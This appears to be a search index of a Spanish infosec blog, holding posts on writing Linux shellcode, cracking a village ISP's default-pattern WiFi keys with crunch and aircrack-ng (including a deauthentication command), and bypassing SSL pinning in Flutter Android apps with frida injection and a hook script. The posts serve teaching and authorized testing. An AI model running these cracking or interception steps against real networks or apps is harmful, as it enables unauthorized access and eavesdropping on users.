[{"categories":["reversing","malware","ASM"],"content":"Introduccion Escribir y entender como funciona una shellcode es un tema que tengo pendiente desde hace mucho tiempo y que mejor manera de intentarlo que con una serie de posts sobre el tema. Creo que el conocimiento sobre esta temática esta pendiente en varias personas, muchos de los que nos dedicamos a infosec en algun momento aprendimos como realizar el análisis de una vulnerabilidad del tipo buffer overflow, descubrimos donde falla la aplicación, como redirigir el flujo del programa, buscamos los “bad chars”, pero al momento de escribir la shellcode usamos nuestro querido msfvenom o copiamos una del sitio “shell-storm” a modo de POC, esto no es casualidad desarrollar y entender como se escribe una shellcode requiere una serie de conocimientos previos algunos de los cuales ya los adquirimos mientras aprendíamos sobre BOF como por ejemplo, manejar un debugger, lenguaje ensamblador, como funciona el stack, etc. Pero con esto no alcanza, para que nuestra shellcode sea util necesitamos aprender un poco mas de lenguaje ensamblador y como interactuar con el sistema operativo subyacente para realizar tareas que nos beneficien, las instrucciones necesarias en ensamblador para realizar acciones en el sistema operativo cambian dependiendo del mismo y hay mas de una manera de hacerlo, no es lo mismo escribir una shellcode para Linux que para Windows. ","date":"06-15-2021","objectID":"/write-shellcode/:1:0","tags":["x86","x64","ASM","Shellcode"],"title":"Escribiendo tu propia shellcode. Parte 1","uri":"/write-shellcode/"},{"categories":["reversing","malware","ASM"],"content":"¿Por que aprender escribir tu propia shellcode? Que mejor que estar en una fiesta y contarles a los presentes que podes escribir una shellcode para ganar una shell inversa en 1 byte(bueno quizás estoy exagerando), vas a ser el alma de la fiesta y todos se van a arrodillar ante tal poder. Tienen que saberloPartyhard \"\rTienen que saberlo\r Haciendo los chistes a un lado siempre que podamos es bueno en nuestra profesión/hobby aprender que es lo que sucede tras bambalinas, hay que tener un equilibrio entre usar herramientas, crearlas o modificar las existentes uno mismo, ya que esto nos da una gran ventaja sobre quienes solo utilizan herramientas sin entender el por que suceden las cosas, si entejemos que y por que estamos haciendo lo que estamos haciendo vamos a poder llegar mas lejos y obtener mejores resultados. A modo de ejemplo, mas de una vez me encontré con una inyección SQL a la cual no le podía sacar provecho utilizando SQLMap y tuve que recurrir a enviar sentencias SQL a mano mediante BurpSuit o en casos mas complejos desarrollar mis propios scripts para demostrar el impacto de la vulnerabilidad, lo mismo sucede en este caso, tenemos una magnifica herramienta como lo es msfvenom para crear nuestras shellcodes pero a veces no funciona en cierto contexto y si conocemos de antemano todos los procesos que involucran la ejecución de una shellcode podemos intentar arreglar el problema, lo otro es que las herramientas automatizadas como SQLMap o msfvenom ya llevan bastante tiempo y su comportamiento esta mas que documentado haciendo que cualquier solución de seguridad detecte su accionar fácilmente, saber como funciona la herramienta para luego replicar o modificar levemente su comportamiento nos ayuda en la mayoría de los casos a saltear estas protecciones, creo que estos motivos son mas que suficientes para que le dediquemos un tiempo a aprender algo que siempre usamos pero que nunca nos preguntamos como funciona. ","date":"06-15-2021","objectID":"/write-shellcode/:2:0","tags":["x86","x64","ASM","Shellcode"],"title":"Escribiendo tu propia shellcode. Parte 1","uri":"/write-shellcode/"},{"categories":["reversing","malware","ASM"],"content":"¿Que es una shellcode? Una shellcode es un set de instrucciones diseñado para manipular la acciones que realiza un programa y que el mismo realice acciones que beneficien al atacante(copiar un archivo, leer un archivo, ejecutar comandos, obtener una reverse shell etc), para que este set de instrucciones sea ejecutado la shellcode debe ser copiada a una region de memoria RAM y luego el flujo de ejecución del programa debe ser redirigido a esa sección de memoria para que las acciones se realicen ","date":"06-15-2021","objectID":"/write-shellcode/:3:0","tags":["x86","x64","ASM","Shellcode"],"title":"Escribiendo tu propia shellcode. Parte 1","uri":"/write-shellcode/"},{"categories":["reversing","malware","ASM"],"content":"¿Como funciona una shellcode? Como mencione al principio escribir una shellcode va a ser diferente dependiendo de cual sea el sistema operativo objetivo por como se maneja internamente las llamadas al sistema creo que es mas simple comenzar por como hacerlo en Linux Para comenzar esa cadena de caracteres que siempre copiamos de nuestra salida de msfvenom no es mas que la representación en hexadecimal de código maquina, msfvenom nos da varias opciones para obtener la salida de la ejecucion del comando, podemos ejecutar lo siguiente para obtener un archivo binario para Linux equivalente a la ejecución del comando “echo ‘Hola HTB’” msfvenom -p linux/x86/exec CMD=\"echo 'Hola Htb'\" -f elf \u003e hola Hola HTBPOC-msfvenom \"\rHola HTB\r Para obtener su equivalente en codigo maquina y analizar el resultado en hexadecimal y cadenas de texto podemos ejecutar lo siguiente: msfvenom -p linux/x86/exec CMD=\"echo 'Hola Htb'\" -f raw | xxd Shellcode hexadecimalPOC-msfvenom-hex \"\rShellcode hexadecimal\r Podemos observar algunas cadenas de texto existentes en el la salida del comando. “/bin/sh” escrito al revés(recordar que en la arquitectura x86 de Intel los bytes son representados en little endian), la cadena “-c” y por ultimo la cadena “echo ‘Hola Htb’”, solo analizando las cadenas de texto podemos inferir que lo que hace es ejecutar el comnando “/bin/sh” con los parámetros “-c echo ‘Hola Htb’”. Por ultimo podemos obtener la representación en código ensamblador de la salida de msfvenom con el siguiente comando. msfvenom -p linux/x86/exec CMD=\"echo 'Hola Htb'\" -f raw | ndisasm -b32 - Shellcode hexadecimalPOC-msfvenom-hex \"\rShellcode hexadecimal\r Obtenemos el resultado en la “lengua oscura”(al menos para los que decidimos “programar” en bash) de la arquitectura X86, por mas que nos duela la vista, nos parezca incomprensible y nos intimide, aprender lenguaje ensamblador no tiene por que ser tan malo, desde mi punto de vista con que aprendamos que son y para que sirven los registros, que es el stack, algunas operaciones básicas del lenguaje (jmp,call,mov,push,pop) vamos a poder medianamente entender que es lo q sucede, tampoco hay necesidad de comerse toda la teoría primero y luego practicar por lo menos a mi me sirve practicar mientras aprendo y esto lo podemos lograr usando el debugger ejecutando instrucción por instrucción viendo como cambian los registros, el stack y por supuesto googlear todo aquello que no entendamos, luego por necesidad de realizar tareas mas complejos iremos profundizando y aprendiendo mas sobre el lenguaje ensamblador. ","date":"06-15-2021","objectID":"/write-shellcode/:4:0","tags":["x86","x64","ASM","Shellcode"],"title":"Escribiendo tu propia shellcode. Parte 1","uri":"/write-shellcode/"},{"categories":["reversing","malware","ASM"],"content":"Syscalls en Linux En los lenguajes de mas alto nivel por lo general usamos funciones integradas en el lenguaje que a su vez se traducen a llamadas a funciones propias del sistema operativo para realizar tareas como leer o escribir un archivo, mostrar un mensaje en pantalla, realizar una conexión TCP, etc. En ensamblador no tenemos estas funcionalidades integradas ergo no tenemos una función llamada “os.system” para ejecutar comandos, aun asi podemos interactuar con el sistema operativo para realizar esas acciones, proceso un poco mas “tedioso” y con algunos detalles pero que cumple con nuestro cometido. No hay una sola manera de hacerlo, tanto en Windows como en Linux podemos hacer una llamada a una librería que nos ayude en dicha tarea, por ejemplo podríamos usar “libc” en Linux y alguna de las funciones que exporta como “execv” o en Windows podríamos llamar a la función “CreateProcessA” de la librería “Kernel32.dll”, pero esto se vuelve complejo en ensamblador ya que la librería debería estar cargada, si no lo esta cargarla y debemos buscar la dirección de la función que queremos llamar al momento de ejecutar nuestra shellcode para que funcione, no es que no se pueda pero es un ejercicio bastante mas complejo y extenso como para arrancar a armar nuestra primer shellcode. Para hacerlo mas fácil vamos a usar las “syscalls” o “llamadas al sistema” en Linux ","date":"06-15-2021","objectID":"/write-shellcode/:5:0","tags":["x86","x64","ASM","Shellcode"],"title":"Escribiendo tu propia shellcode. Parte 1","uri":"/write-shellcode/"},{"categories":["reversing","malware","ASM"],"content":"Interrupciones en lenguaje ensamblador En lenguaje ensamblador tenemos una instrucción que se escribe como “INT” que provoca una interrupción por software, esta instrucción va precedida de un numero entre 0 y 255 en decimal, en nuestro caso vamos a usar la instrucción “INT” con el valor “80” en hexadecimal, esto provoca una interrupción que transfiere el flujo del programa al Kernel de Linux para realizar llamadas al sistema o “syscalls”, para que el Kernel sepa que operación queremos realizar va a tomar el valor del registro “EAX”. ","date":"06-15-2021","objectID":"/write-shellcode/:5:1","tags":["x86","x64","ASM","Shellcode"],"title":"Escribiendo tu propia shellcode. Parte 1","uri":"/write-shellcode/"},{"categories":["reversing","malware","ASM"],"content":"Desarrollando nuestra primer shellcode Vamos a compilar un ejemplo de código en C que muestre un mensaje en pantalla. #include \u003cstdio.h\u003e int main() { printf(\"Hola mundo!\\n\"); return 0; } Con el comando strace es posible ver que llamadas son realizadas por un programa, como vemos para imprimir un mensaje en por “stdout”(standard output) se utiliza la llamada “write” Ejecutando comando straceHello-Strace \"\rEjecutando comando strace\r Para saber a que numero corresponde cada syscall podemos mirar el archivo “/usr/include/asm/unistd_32.h”. Numeros de syscallsyscall-write \"\rNumeros de syscall\r Si queremos obtener mas informacion de “write” podemos ejecutar man 2 write Manualpage de writemanwrite \"\rManualpage de write\r Recapitulando, entonces para poder crear una shellcode que sea capaz de mostrar un mensaje en pantalla debemos. Ejecutar la instrucción “Int 80h” para generar una llamada al sistema Para que el Kernel sepa que syscall vamos a ejecutar debemos escribir en el registro “EAX” un numero en nuestro caso para usar la llamada write tenemos que escribir el valor “4”. Luego necesitamos pasarles los argumentos a la llamada, como el fd(file descriptor) en este caso el stdout que es equivalente a 1, el puntero a la dirección de memoria de nuestro mensaje, y por ultimo el tamaño del mensaje. Se espera que estos parámetros estén guardados en ciertos registros, “EBX” para el primero, “ECX” para el segundo y “EDX” para el tercero. EAX =\u003e Valor 4 perteneciente a la syscall write EBX =\u003e 1er argumento: fd o file descriptor. Es 1 para stdout. ECX =\u003e 2do argumento: dirección de memoria del mensaje a imprimir. EDX =\u003e 3er argumento: longitud del mensaje en bytes, serian 9 bytes para el mensaje 'Hola Htb' junto con el carácter de salto de linea . section .text global _start _start: mov eax,4 ; movemos el valor 4 a EAX para llamar a la syscall write mov ebx,1 ; Movemos el valor 1 a EBX como primer parámetro para write push 0x0a ; hacemos un \"push\" del valor \"0a\" en hexadecimal equivalente al salto de linea al stack push 0x62744820 ; Hacemos un push del valor de la cadena \" Htb\" representada en bytes en little endian push 0x616c6f48 ; Hacemos un push del valor de la cadena \"Hola\" representada en bytes en little endian mov ecx,esp ; Movemos el valor de ESP, este valor contiene la dirección de memoria del tope de la \"pila\" o \"stack\" y ;lo usamos como puntero para el string que queremos mostrar mov edx,9 ; movemos el valor 9 a EDX, 9 es el valor de la longitud de la cadena que queremos imprimir en pantalla int 80h ; llamamos a la interrupción 80h El código anterior no es el mejor y el mas apto para una shellcode luego vamos a ver por que, pero a fines prácticos de repasar en código ensamblador todo lo que nombramos anteriormente funciona. Podemos guardar el código anterior y compilarlo de la siguiente manera. nasm -f elf holahtb.asm ld -m elf_i386 -o holahtb holahtb.o Al principio cuesta mucho ver el código e intentar entender que es lo que va a suceder, créanme cuando les digo que a mi también me cuesta. Por este motivo podemos agarrar el desensamblador/debugger que mas nos guste y ver instrucción por instrucción que es lo q esta ocurriendo en la memoria y los registros. En mi caso voy a usar IDA para verlo. Analizando el codigo en IDAIDA \"\rAnalizando el codigo en IDA\r Podemos pararnos en la primera instrucción “mov eax,4” y poner un breakpoint con F2, iniciar el programa y cuando IDA se pare sobre esa sección del código ir avanzando instrucción por instrucción con F7. Instrucciones, Registros, StackIDA \"\rInstrucciones, Registros, Stack\r Podemos ver nuestro set de instrucciones a ejecutar, IDA pauso la ejecución en la instrucción “MOV eax,4” Vemos los valores de los registros Los valores en el stack La vista en hexadecimal y caracteres ASCII del stack Paso a paso Como dije podemos agarrar una hoja y un papel para hacer una traza la ejecución de las instrucciones paso a paso o agarramos un debugger para ver que esta sucediendo. “MOV eax,4” Esta ins","date":"06-15-2021","objectID":"/write-shellcode/:5:2","tags":["x86","x64","ASM","Shellcode"],"title":"Escribiendo tu propia shellcode. Parte 1","uri":"/write-shellcode/"},{"categories":["wifi","brute foce"],"content":"WiFi Cooperativo en la aldea de montaña Esta prueba se realizó en un entorno controlado con los permisos de los clientes adjudicatarios de los dispositivos involucrados, con el fin único de reconocer el nivel de seguridad de acceso a los dispositivos wifi desde una perspectiva ética de investigación en InfoSec. Pasé tres semanas en San Martín de los Andes y noté que las claves WiFi por defecto del único proveedor de Internet tienen un patrón sumamente sencillo. Poseen 8 dígitos y todas comienzan con los mismos cuatro caracteres y los últimos 4 son alfanuméricos aleatorios. Por lo que existen solamente 1679616 posibilidas. Para generar un diccionario con dichas líneas, utilizaré la herramienta crunch. ","date":"01-13-2021","objectID":"/wifialdea/:0:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["wifi","brute foce"],"content":"Instalar crunch \u0026 dictionary Pueden intalarla en cualquier distribución Debian con el siguiente comando (Kali ya lo trae): sudo apt-get install -y crunch El comando para crear este diccionario es muy sencillo crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -t cote@@@@ -o cotexxxx.txt El primer 8 es el mínimo de caracteres de las claves y el segundo 8 el máximo de caracteres. Aquí solo necesitamos claves de 8 caracteres. El string “abcdefghijklmnopqrstuvwxyz0123456789” que le sigue determina los caracteres a utilizar para la porción aleatoria de las claves. La opción “-t” especifica un patrón para los caracteres aleatorios. En este caso es @, que se trata de minúsculas y también tomará los números que hemos indicado anteriormente. A esto le sigue la estructura del patrón “cote@@@@”. Las @s serán los caracteres reemplazados por todas las variantes de la a a la z y del 0 al 9. La opción “-o” indica la salida. Nombramos el archivo como nos guste. Ahora contamos con un diccionario que contiene todas las claves por defecto de la ciudad El siguiente paso es conseguir el archivo que contenga el handshake cifrado de la red WiFi. Para ello utilizamos aircrack-ng. ","date":"01-13-2021","objectID":"/wifialdea/:1:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["wifi","brute foce"],"content":"Instalar aircrack Para instalarlo en cualquier versión Debian (Kali también lo trae): sudo apt install aircrack-ng ","date":"01-13-2021","objectID":"/wifialdea/:2:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["wifi","brute foce"],"content":"Our WiFi Interface Nos fijamos el nombre de nuestra placa con ifconfig ifconfig wlan0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 192.168.1.38 netmask 255.255.255.0 broadcast 192.168.1.255 inet6 fa80::4g23:98l6:ka0:3436 prefixlen 64 scopeid 0x20 ether 59:96:1b:95:b0:2d txqueuelen 1000 (Ethernet) RX packets 275495 bytes 308923532 (308.9 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 103650 bytes 21966607 (21.9 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Antes de comenzar realizamos un check kill para evitar cualquier conflicto. sudo airmon-ng check kill ","date":"01-13-2021","objectID":"/wifialdea/:3:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["wifi","brute foce"],"content":"Monitor Mode Luego ponemos nuestra placa wifi en modo monitos: sudo airmon-ng start wlan0 ","date":"01-13-2021","objectID":"/wifialdea/:4:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["wifi","brute foce"],"content":"Redes WiFi en nuestro aire Escaneamos las redes: sudo airodump-ng start wlan0mon ","date":"01-13-2021","objectID":"/wifialdea/:5:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["wifi","brute foce"],"content":"Escuchando por un handshake Una vez elegido el accesspoint al que queremos acceder, con ctrl + c detenemos el escaneo y nos pondremos a la escucha del accesspoint seleccionado: sudo airodump-ng -c 6 -b 00:01:12:56:32:56 -w nombredelarchivocondatosescuchados wlan0mon Acá “-w” indica el nombre del archivo en el que se guardarán los datos capturados. “-c” indica en canal por el que trabaja el accesspoint. “-b” indica la MAC del accesspoint (BSSID). Por último, la interface que usamos, en este caso “wlan0mon”. Al darle enter comenzará a escuchar ese accesspoint. Veremos la cantidad de paquetes capturados y perdidos. En al parte inferior de la terminal, se observan los clientes conectados al accesspoint, elegimos uno para deantenticar y obtener el handshake (paquete que contiene la clave WiFi encriptada). ","date":"01-13-2021","objectID":"/wifialdea/:6:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["wifi","brute foce"],"content":"Deauntenticar al cliente Mientras el proceso anterior continúa corriendo, en otra terminal realizamos una deautenticación del cliente con los datos copiados. Es decir, del BSSID (accesspoint) y de una STATION (cliente). aireplay-ng -0 10 -a 00:01:12:56:32:56 -c 00:00:10:A0:05:06 wlan0mon Acá “-0” indica la orden deauntenticar. “-a” la MAC del accesspoint. “-c” la MAC del cliente a deauntenticar. Por último, la interfaz que utilizamos en modo monitor, en este caso “wlan0mon”. Al conseguir el handshake, se notificará en la terminal que está escuchando, abierta en el punto Escuchando por un handshake Se obersva el mensaje en la parte superior derecha. Verán algo así: HandshakeHandshake \"\rHandshake\r ","date":"01-13-2021","objectID":"/wifialdea/:7:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["wifi","brute foce"],"content":"Brute force final Por último, utilizamos fuerza bruta para probar todas las claves del diccionario sobre el archivo que contiene el handshake con el siguiente comando: sudo aircrack-ng -w cotexxxx.txt -b 00:01:12:56:32:56 nombredelarchivocondatosescuchados.cap KEY FOUND! [ cotefr33 ] ","date":"01-13-2021","objectID":"/wifialdea/:8:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["wifi","brute foce"],"content":"Recomendaciones: Generar claves de diez caracteres en la que todos sus caracteres sean aleatorios. ¡Disfruten el lago, la montaña y un WiFi seguro! ","date":"01-13-2021","objectID":"/wifialdea/:9:0","tags":["wifi","aircrack","brute force"],"title":"WiFi Cooperativo en la aldea de montaña","uri":"/wifialdea/"},{"categories":["mobile","burpsuite"],"content":"En la primera parte vimos como encontrar el offset a parchear con frida, a partir de ahi solo deberíamos ejecutar el script de frida para que parchee la aplicacion que deseemos en memoria. Debido a que no deseaba rootear mi celular esto trajo aparejado otro desafiado. Para resumir lo que haremos es lo siguiente. Desempaquetar nuestro APK objetivo Descargar el gadget de frida según la arquitectura de la aplicación objetivo arm64 o arm32. Inyectar el gadget en la aplicacion. Reempaquetar el APK. Subirlo e instalarlo a nuestro dispositivo. Configurar nuestro Linux como puerta de enlace. Antes de arrancar cabe aclarar que necesitamos activar en nuestro dispositivo las “opciones de desarrollador”. Descargamos y descomprimimos “frida-gadget”. wget https://github.com/frida/frida/releases/download/14.1.0/frida-gadget-14.1.0-android-arm.so.xz unxz -d frida-gadget-14.1.0-android-arm.so.xz Desempaquetar el APK objetivo apktool d -rs target.apk Se recomienda utilizar apktool para el desempaquetado ya que unzip/zip no siempre funciona correctamente. Copiamos “frida-gadget” a la carpeta donde se encuentran los archivos desempaquetados. cp frida-gadget-14.1.0-android-arm.so target/lib/armeabi-v7a/libfrida-gadget.so Escribimos un script en python para injectar “frida-gadget” usando la libreria lief(ver las instrucciones de instalacion en la pagina del proyecto) #!/usr/bin/env python3 import lief libnative = lief.parse(\"target/lib/armeabi-v7a/libflutter.so\") libnative.add_library(\"libfrida-gadget.so\") # Injection! libnative.write(\"target/lib/armeabi-v7a/libflutter.so\") Este script una vez ejecutado va a parchear “libflutter.so” y agrearle el gadget de frida como libreria. Correr el script. python3 inject-gadget.py Reempaquetar el APK. # \"target\" es el directorio donde desempaquetamos nuestro apk. apktool b target Firmar el APK, podemos usar “Uber APK signer”. java -jar uber-apk-signer-1.2.1.jar -a ./target/dist/target.apk Instalar el APK. Con nuestro dispositivo con las opciones de desarrollador habilitadas podemos usar adb para hacerlo. adb install -r target/dist/target-aligned-debugSigned.apk En nuestro dispositivo abrimos la aplicación instalada si la aplicación queda congelada es un buen indicio, si se cierra hay que revisar el proceso nuevamente ya que probablemente fallamos en algún paso. Lo siguiente es correr el script de frida para que se “tracear” la aplicación y cada vez que se llame a la función encargaría de validar el certificado esta siempre devuelva que el resultado es correcto. El script es el siguiente: function hook_ssl_verify_result(address) { Interceptor.attach(address, { onEnter: function(args) { console.log(\"Disabling SSL validation\") }, onLeave: function(retval) { console.log(\"Retval: \" + retval) retval.replace(0x1); } }); } function disablePinning() { var m = Process.findModuleByName(\"libflutter.so\"); var pattern = \"2d e9 f0 4f a3 b0 81 46 50 20\" var res = Memory.scan(m.base, m.size, pattern, { onMatch: function(address, size){ console.log('[+] ssl_verify_result found at: ' + address.toString()); // Add 0x01 because it's a THUMB function // Otherwise, we would get 'Error: unable to intercept function at 0x9906f8ac; please file a bug' hook_ssl_verify_result(address.add(0x01)); }, onError: function(reason){ console.log('[!] There was an error scanning memory'); }, onComplete: function() { console.log(\"All done\") } }); } setTimeout(disablePinning, 1000) Recordar cambiar la variable “pattern” que corresponde a los primeros bytes del inicio de la función según corresponda lo que hayamos encontrado en ghidra. Con el script una vez guardado ejecutamos lo siguiente.(Recordar que debemos instalar frida segun corresponda en Windows, MAC, Linux) frida -U Gadget -l inject.js --no-pause Por ultimo como las aplicaciones en flutter ignoran la configuración del proxy que que hayamos seteado en Android vamos a configurar nuestra maquina con Linux como puerta de enlace sysctl -w net.ipv4.ip_forward=1 iptables -t nat -A PREROUTING -i eth","date":"11-25-2020","objectID":"/bypasss-ssl-android-flutterapp-2/:0:0","tags":["pentesting","mobile","flutter"],"title":"Bypaseando la verificación SSL en una app de flutter en Android. Parte 2)","uri":"/bypasss-ssl-android-flutterapp-2/"},{"categories":["mobile","burpsuite"],"content":"Aun recuerdo cuando la vida era mas fácil para los chismosos y el SSL era utilizado con suerte solo en el envió del login, el resto de la información viajaba sin cifrar, mas o menos en 2010 eso empezó a cambiar luego de que saliera la extension de Firefox Firesheep cualquier persona con solo instalarse la extension podía realizar un ataque del tipo “man in the middle” robarse las cookies de sesión de sitios como Facebook, Twitter, Google y realizar un “session hijacking” o secuestro de sesión y sin saber la contraseña entrar en la cuenta del usuario afectado, junto con la expansión de las redes WIFI publicas esto era un gran problema,muchos se habian convertido en un potencial “hackerman”. HackermanHackerman \"\rHackerman\r Por suerte las personas dedicadas a infosec están ahi al pie de cañon colaborando para que la seguridad de todas y todos mejore, el desarrollo de esa extension fue un tirón de oreja para que al menos los grandes como Google, Twitter, Facebook aplicaran SSL a todo el trafico web, luego mas tarde nació el proyecto “Let’s encrypt” para ofrecer certificados SSL validos sin tener que poner nada de tu bolsillo, hoy no hay excusas mas que desidia del Sysadmin/desarrollador para no tener su sitio, api endpoint sin certificado SSL. ","date":"10-16-2020","objectID":"/bypasss-ssl-android-flutterapp/:0:0","tags":["pentesting","mobile","flutter"],"title":"Bypaseando la verificación SSL en una app de flutter en Android. Parte 1)","uri":"/bypasss-ssl-android-flutterapp/"},{"categories":["mobile","burpsuite"],"content":"Analisis de trafico en Android Antes que nada quiero comentarles que no soy un experto en realizar análisis de trafico o reversing en en Android, lo he realizado de manera muy casual. Las veces anteriores que lo realice fue en versiones de Android 6 y anteriores, con la version 6 y anteriores realizar el análisis de trafico de una aplicación de Android es bastante trivial, abríamos nuestro burpsiuite lo poníamos a escuchar instalábamos el certificado de Burp en nuestro dispositivo, lo configurábamos para que el use el proxy que especifiquemos y listo. En Android 7 para adelante primero que nada las aplicaciones usan solo los certificados instalados en el sistema e ignoran los instalados por el usuario, ademas se hizo mas facil para los desarrolladores verificar que la conexión se realiza realmente con el servidor que esperan y no que en caso de un man in the middle con un certificado valido un atacante pueda interceptar el trafico, este chequeo se lo conoce como “SSL Pinning”. Bueno para la seguridad de los usuarios de Android, malo para administradores de red de organizaciones en las cuales todo pasa por un proxy y un certificado autofirmado,para los investigadores/pentesters que deseen analizar el trafico no significa el fin pero si pone las cosas un poco mas complejas. SSL EveryhwereSSL Everyhwere \"\rSSL Everyhwere\r ","date":"10-16-2020","objectID":"/bypasss-ssl-android-flutterapp/:1:0","tags":["pentesting","mobile","flutter"],"title":"Bypaseando la verificación SSL en una app de flutter en Android. Parte 1)","uri":"/bypasss-ssl-android-flutterapp/"},{"categories":["mobile","burpsuite"],"content":"Opciones Para poder analizar el trafico en aplicaciones en Android 7 para adelante si podemos “rootear” el dispositivo vuelve a ser bastante trivial ya que tendríamos permisos de instalar cualquier certificado en el almacenamiento del “sistema”, nuevamente configuramos nuestro proxy y esta todo funcionando. El problema es que con la facilidad que se le dio desarrolladores de Android de realizar un “SSL pining” muchas aplicaciones tienen esta verificación y tira por la borda lo anterior. Aquí entra en juego una maravillosa herramienta que nos da la capacidad de inyectar código en las aplicaciones y cambiar el comportamiento de la misma, estoy hablando de frida. Frida es una herramienta que nos permite inyectar código en procesos en ejecución en múltiples plataformas, Android, iOS, Windows, MAC, etc. Si bien todo es mas fácil con un dispositivo rooteado en esta entrega lo voy a hacer en dispositivo sin dicha capacidad. ","date":"10-16-2020","objectID":"/bypasss-ssl-android-flutterapp/:2:0","tags":["pentesting","mobile","flutter"],"title":"Bypaseando la verificación SSL en una app de flutter en Android. Parte 1)","uri":"/bypasss-ssl-android-flutterapp/"},{"categories":["mobile","burpsuite"],"content":"Flutter Flutter es un Framework de codigo abierto para el desarrollo de aplicaciones moviles desarrollado por Google. Flutter promete el desarrollo de aplicaciones nativas para Android e iOS de forma fácil, rápida y sencilla (no es eso lo que prometen todos los Frameworks(?)). En mi caso particular me encontré con que la aplicación sobre la cual quise realizar el análisis de trafico estaba hecha usando flutter, asi que sumado a lo que mencione anteriormente tuve que ponerme a buscar como funcionaba y me encontré con que las aplicaciones en Flutter ignoran completamente la configuración del proxy del sistema y cuando la aplicación se compila genera su propio “Keystore” usando la libreria NSS de Mozilla, para resumir instalar un certificado como root en nuestro dispositivo no nos serviría ya que las aplicaciones desarrolladas en Flutter utilizan los certificados embebidos dentro de la aplicación al momento de compilarla. ","date":"10-16-2020","objectID":"/bypasss-ssl-android-flutterapp/:3:0","tags":["pentesting","mobile","flutter"],"title":"Bypaseando la verificación SSL en una app de flutter en Android. Parte 1)","uri":"/bypasss-ssl-android-flutterapp/"},{"categories":["mobile","burpsuite"],"content":"Reversing Flutter App Ingenieria inversa flutter APPIngenieria inversa flutter APP \"\rIngenieria inversa flutter APP\r Lo expuesto a continuación no fue desarrollo propio es producto de lo aprendido de este genial post escrito en ingles, no voy a profundizar mucho en el por que de lo que se replica a continuación asi que recomendada lectura si quieren profundizar mas sobre el tema. Como nos comenta el autor del post que mencione gracias a que Dart el lenguaje de programación que usa Flutter es opensource y la librería BoringSSL también lo es, es “fácil” hacer un bypass de la validación del SSL, para ello debemos hookear la función encargarda de la verificación y para eso vamos a usar frida, para modificar el flujo de la función y hacer que siempre devuelva que verificación es correcta. En el post se menciona que luego de hacer un análisis de las funciones en la librería BoringSSL encuentra una función llamada “ssl_crypto_x509_session_verify_cert_chain” definida en ssl_x509.cc, esta funcion devuelve un tipo de dato booleano y la hace una buena candidata para realizar el hook sobre la misma. Para poder hookear la función con frida vamos a tener que saber cual es su dirección de memoria. Primero que nada vamos a tener que descargarnos el APK con la aplicacion en flutter que vamos a analizar, luego descomprimir sus archivos con la aplicación apktool(no se recomienda realizar un “unzip” ya que puede provocar un resultado no esperado). Una vez descargada podemos correr lo siguiente apktool d -rs target.apk Como mencionamos anteriormente Flutter genera aplicaciones nativas, asi que dentro de lo que descomprimimos podemos encontrar en la carpeta “lib” nuestra aplicación, en este caso 2 archivos en “libapp.so” donde se encuentra toda la lógica de aplicación y en “libflutter.so” todas las funcionalidades de flutter en si, como por ejemplo la función de la librería de BoringSSL que estamos buscando. Archivos FlutterArchivos Flutter \"\rArchivos Flutter\r Luego podemos proceder a decompilar “libflutter.so” con ghidra. Para buscar la funcion “ssl_crypto_x509_session_verify_cert_chain” vamos a tener que decompilar “libflutter.so” y que ghidra haga un análisis, luego de que termine se nos menciona que mediante la funcion “Search -\u003e Find Strings” en ghidra podemos buscar la cadena de texto “x509.cc” Busqueda GhidraBusqueda Ghidra \"\rBusqueda Ghidra\r Resultado GhidraResultado Ghidra \"\rResultado Ghidra\r En nuestro caso tenemos 8 “lugares” donde aparece dicha cadena, como son pocas las coincidencias podemos hacer un analisis manual de cada una de las secciones en donde se encontro el string y ver si damos con algo que se parezca a la función “ssl_crypto_x509_session_verify_cert_chain”. BoringSSL FuncionBoringSSL Funcion \"\rBoringSSL Funcion\r En el codigo en el repo de github podemos ver que la funcion toma 3 parametros y mas abajo que “OPENSSL_PUT_ERROR” es llamado una sola vez. BoringSSL FuncionBoringSSL Funcion \"\rBoringSSL Funcion\r Luego de analizar manualmente las locaciones encontradas en ghidra damos con una funcion y su codigo decompilado en C que se asemejan a lo anterior. Funcion decompiladaFuncion decompilada \"\rFuncion decompilada\r Perfecto encontramos nuestra funcion! Ahora ya podemos inyectar codigo con frida y modificar la función para que siempre devuelva “1” o verdadero y el chequeo ya no sea un problema. Para esto vamos a copiar los primeros 10 bytes de la funcion para generar una “firma”, luego frida va a buscar esos primeros 10 bytes en la memoria del proceso y va a realizar el hook en la direccion que encuentre esos 10 bytes, recordar que tanto la direccion en la que encontramos la funcion como los primeros 10 bytes pueden cambiar por varios factores asi que recomiendo hacer el proceso por su cuenta y encontrar la direccion para su aplicacion particular, en mi caso es “2d e9 f0 4f a3 b0 81 46 50 20”. Seleccionamos los primeros 10 bytesCodigo ensamblador \"\rSeleccionamos los primeros 10 bytes\r Ya tenemos los bytes para encontrar la func","date":"10-16-2020","objectID":"/bypasss-ssl-android-flutterapp/:4:0","tags":["pentesting","mobile","flutter"],"title":"Bypaseando la verificación SSL en una app de flutter en Android. Parte 1)","uri":"/bypasss-ssl-android-flutterapp/"},{"categories":["mobile","burpsuite"],"content":"Conclusion Por ahora terminamos con esta primer parte en la cual solo nos encargamos de encontrar la función que necesitamos para hacer el bypass, en la proxima parte vamos a re-empaquetar el APK con la aplicacion 